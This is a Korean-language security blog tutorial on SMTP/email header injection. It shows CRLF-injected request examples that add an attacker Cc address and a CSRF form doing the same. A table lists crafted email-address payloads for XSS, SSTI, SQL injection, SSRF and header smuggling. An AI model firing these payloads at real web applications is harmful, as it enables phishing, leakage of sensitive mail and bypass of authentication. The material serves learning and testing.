---
layout: single
title: SMTP Injection(Email injection)
categories: Web-vuln
tag: [SMTP Injection, Email injection, web, web vulnerability, injection]
toc: true
author_profile: false
---

# SMTP란 무엇일까?

> SMTP란 단순 전자우편 전송 프로토콜로서 대부분의 Email 소프트웨어 들이 사용하는 프로토콜이다. 보통 웹 어플리케이션에서 메일전송과 관련된 기능 및 API 는 SMTP 프로토콜을 통해 이루어진다.

# SMTP 를 통한 Injection??
웹페이지 내에서 이메일 전송 기능을 사용할 때 송/수신자 내용 제목 등등의 관련 양식을

**<u style="color:red;">SMTP 헤더에 포함</u>**시켜 전송하게 된다. 이 때 요청 **<u style="color:red;">헤더를 조작(Injection)</u>**을 통해서 공격자의 메일로 추가 전송을 시킬 수 있다.<br><br>
예를 들어 패스워드 변경후의 내용과 같은 민감한 정보가 수신자의 메일로 넘어갈 때 공격자의 메일정보를 요청헤더에 추가시켜 민감정보가 노출될 수 있다.<br>
이러한 헤더는 웹 서버의 이메일 라이브러리에 의해 해석되고 결과 SMTP 명령으로 변환된 다음 SMTP 서버에서 처리된다.

# SMTP Header
SMTP의 HTTP 요청 헤더를 조작 하여 공격을 수행할 수 있다고 소개했다. 그럼 SMTP 에서
사용되는 요청 헤더의 종류는 어떤것들이 존재할까?<br>
대표적으로 잘 알려진 헤더는 아래와 같다.

<div class="notice">
- From<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 보내는 사람의 ID<br>
- Resent-From<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 전달한 사람<br>
- Reply-To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 응답을 보낼 사서함을 나타내는 메커니즘<br>
- Resent-Reply-To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 회신을 전달해야 하는 사람<br>
- Return-Path<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지 발신자에 대한 주소 및 경로에 대한 결정적 정보<br>
- Sender<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 보낸 에이전트의 인증된 ID (사람, 시스템, 프로세스등)<br>
- Resent-Sender<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- ㅁ메시지를 재전송한 에이전트의 인증된 ID<br>
- To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메신지의 기본 수신자<br>
- <u style="color:red;">Cc(참조)</u><br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지의 보조 수신자<br>
- <u style="color:red;">Bcc(숨은참조)</u><br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지의 추가 수신자
</div>

💡 **<u style="color:red;">SMTP 의 Header을 조작하기 위해 CR-LF Injection 을 활용하여 공격을 수행할 수 있다.</u>**

<div class="notice">
POST /emailtest HTTP/1.1<br>
<br>
'''<br>
<br>
subject=Hello+Test
</div>

위와 같이 subject 값을 받아서 관리자 혹은 특정 사용자에게 메일을 전송하는 기능이 존재하는
웹 사이트를 식별했다고 가정하자.<br><br>

해당 로직에서 SMTP의 취약한 부분이 존재하며, CR-LF 주입이 가능하다면
아래와 같이 값을 조작하여 Header 을 조작할 수 있다. 즉 송/수신자 혹은 내용등을 임의로 조작
할 수 있다는 것이다. 직 **<u style="color:red;">피싱</u>**메일로도 변질이 가능하다는 것이다.

# 공격 표면
특정 요청 혹은 로직에 의해 **<u style="color:red;">이메일기능</u>**이 적용되어, 이메일 전송 기능이 존재한다면, SMTP Injection의 잠재적 공격 표면이 될 수 있다.

## Cc 및 Bcc 조작
참조 및 숨은참조라는 뜻으로, 수신받는 사용자를 추가 시킬 수 있는 헤더이다.

<div class="notice">
POST /emailtest HTTP/1.1<br><br>

'''<br><br>

subject=Hello+Test%0d%0aCc: Attacker@email.com
</div>
💡 **<u style="color:red;">CSRF 와 같은 취약점과 연계할 경우 2FA 인증 우회 및 민감정보등이 유출될 수 있다.</u>**

```html
<form arciton="https://weakness-service/authentication" method="post">
    <input type=text name="email" value="target@domain.com%0ACc:attacker@domain.com">
</form>
```

## Subject OR Massage

<div class="notice">
POST /emailtest HTTP/1.1<br><br>

'''<br><br>

subject=Hello+Test%0d%0aSubject: Fake Subject<br><br>

POST /emailtest HTTP/1.1<br><br>

'''<br><br>

subject=Hello+Test%0d%0a%0d%0akikiki%20hacking!!
</div>

## PHP mail() Function
> mail 시스템 처리를 위해 command line을 통해 타 mail application을 사용할 경우 특수문자에 대한 필터링일 적절하게 이루어지지 않을경우, command injection으로 이어질 위험성이 존재한다.

# Email address format 을 통한 취약점 연계 기술들
Email address format에는 <span style="background-color: #FFB6C1;">local-part@domain</span> 부분으로 나뉜다.<br>
정확히는 아래와 같이 구분할 수 있다.

> attacker@email.com

1. username : attacker
2. @ symbol : @
3. dot(.) : .
4. Domain Name : email.com

## Local-part 부분에서 사용가능한 문자

<div class="notice">
1. 대소문자 및 소문자<br>
2. 숫자 0~9<br>
3. 몇몇의 특수 문자들 : !#$%&'*+-/=?^_`{|}~<br>
4. dot(.) : 첫 번째 또는 마지막문자가 아니며, 연속적으로 나타나지 않는 경우
</div>
()(괄호)는 Local-part 에서 주석을 의미할 수 있다.<br>
tartget+attacker@email.com === target@email.com 과 동일하다.<br><br>
드물게 특수문자들은 제한적으로 사용이 가능하다."(),:;<>@[\]<br>
도한 주석을 의미할 수 있다. 물론<br><br>
tartget(attacker)@email.com === target@email.com 과 동일하다.<br>
이를 통해 WhiteList 정책 필터링을 우회할 수 있다.

<img src="/assets/image/vuln/web-vuln/SMTPI/image.png" alt="그림 1-1" width="300"/>
<img src="/assets/image/vuln/web-vuln/SMTPI/image-1.png" alt="그림 1-2" width="300"/>

[ ] 를 사용하여 IP를 대입할 수도 있다.
<div class="notice">
trust@[127.0.0.1]
</div>

## " 를 사용하게 된다면??

Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급력은 엄청나진다.
공백 및 특수문자등 일반적인 Local-Part 부분에서 사용할 수 없는 문자들이 사용 가능해진다.
즉, 특수문자를 사용해야하는 Web-attack 공격기법들이 전부 사용 가능할 수 있다.


| Vulnerability                  | Payload                                                      |
|--------------------------------|--------------------------------------------------------------|
| XSS                            | test+(\<script>alert(1)\</script>)@example.com           |
|                                | test@example(\<script>alert(1)\</script>.com             |
|                                | "\<script>alert(1)\</script>"@example.com                |
| Template Injection (SSTI)      | "<%=7*7%>"@example.com                                   |
|                                | test+(${{7*7}})@example.com                              |
| SQL Injection                  | "' or 1=1 --'"@example.com                               |
|                                | "mail'); drop table users;--"@example.com                |
| SSRF                           | trust@abc123.interserver                                 |
|                                | trust@[127.0.0.1]                                        |
| Parameter Pollution            | victim&email=attacker@example.com                        |
| (Email) SMTP Header Injection  | "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com       |
|                                | "recipient@test.com>\r\nRCPT TO:<victim+"@test.com       |
| Wildcard abuse                 | %@example.com                                            |




💡 **<u style="color:red;">이러한 공격들은 특정 사용자들의 이메일 정보를 관리자에게 보낼 때 시도해볼 수 있다.</u>**

# Reference
- https://www.ibm.com/docs/en/zos/2.2.0?topic=process-step-4-customize-smtp-mail-headers-optional
- https://www.acunetix.com/blog/articles/email-header-injection
- https://www.hahwul.com/cullinan/email-injection
- https://book.hacktricks.xyz/pentesting-web/email-injections